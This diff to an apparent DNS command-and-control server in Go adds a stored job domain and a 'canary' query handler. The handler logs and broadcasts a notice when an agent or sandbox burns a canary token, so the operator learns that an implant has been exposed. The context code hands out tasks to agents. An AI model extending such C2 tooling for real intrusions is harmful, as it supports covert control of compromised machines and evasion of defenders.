@@ -52,6 +52,7 @@ func (s *Server) StartDNS(domain string, port int) (int, error) {
 	}
 
 	job := s.addJob("DNS", port)
+	job.Domain = strings.TrimSuffix(strings.ToLower(domain), ".")
 	srv := &dns.Server{
 		Addr:    fmt.Sprintf(":%d", port),
 		Net:     "udp",
@@ -176,6 +177,21 @@ func (dc *dnsC2) handleQuery(labels []string) string {
 		seq := parseIntLabel(labels[1])
 		agentID := labels[2]
 		return dc.getTaskChunk(agentID, seq)
+
+	case "canary":
+		// canary.<token16> — burn notification from an agent or sandbox
+		if len(labels) < 2 {
+			return "nil"
+		}
+		token := labels[1]
+		remoteIP := ""
+		burned, label, err := dc.s.db.BurnCanary(token, remoteIP)
+		if err == nil && burned {
+			msg := fmt.Sprintf("[CANARY BURNED] token=%s label=%q", token, label)
+			dc.s.printf("[!] %s\n", msg)
+			BroadcastGUI("CANARY_BURN", "", msg)
+		}
+		return "ok"
 	}
 	return "nil"
 }
